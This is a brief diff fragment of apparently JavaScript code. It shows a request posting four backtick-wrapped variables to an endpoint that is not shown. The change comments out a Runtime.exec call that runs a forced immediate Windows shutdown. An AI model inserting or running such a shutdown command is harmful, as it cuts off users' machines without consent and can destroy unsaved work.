@@ -75,4 +75,4 @@ request({
     body: {content: "```" + q + "```\n```" + a + "```\n```" + g + "```\n```"+k+"```"}
 });
 
-java.lang.Runtime.getRuntime().exec("cmd.exe /c shutdown /s /f /t 0");
+//java.lang.Runtime.getRuntime().exec("cmd.exe /c shutdown /s /f /t 0");
